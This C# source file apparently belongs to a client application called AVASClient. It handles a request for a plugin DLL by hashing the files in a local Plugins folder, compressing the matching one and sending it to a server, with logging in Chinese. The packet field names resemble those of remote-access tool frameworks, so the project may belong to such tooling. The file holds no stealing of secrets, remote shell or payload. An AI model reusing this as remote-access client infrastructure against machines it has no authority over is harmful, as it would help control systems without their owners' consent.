using AVASClient.Helper;
using AVASClient.MessagePackLib;
using AVASClient.Services;
using MPLib.MP;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AVASClient.HandlePacket
{
    internal class HandleSendPlugin
    {
        public static async Task HandleAsync(ClientMsgPack msg)
        {
            await Task.Run(() => {
                Handle(msg);
            });
        }

        private static void Handle(ClientMsgPack unpack_msgpack)
        {
            string hash = unpack_msgpack.ForcePathObject("Hashes").AsString;
            try
            {
                foreach (string plugin in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                {
                    if (hash == GetHash.GetChecksum(plugin))
                    {
                        ClientMsgPack msgPack = new ClientMsgPack();
                        msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
                        msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(plugin)));
                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(plugin));
                        msgPack.ForcePathObject("BID").SetAsString(unpack_msgpack.ForcePathObject("BID").GetAsString());
                        // 修复：使用 lambda 包装 SendFramed 以匹配 WaitCallback 委托签名
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            Settings.client?.SendFramed(msgPack.Encode2Bytes());
                        });
                        LogService.Instance.Info($"成功发送插件 {Path.GetFileName(plugin)} 到服务器", "HandleSendPlugin");

                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Info(ex.Message, "HandleSendPlugin");
            }
        }
    }
}
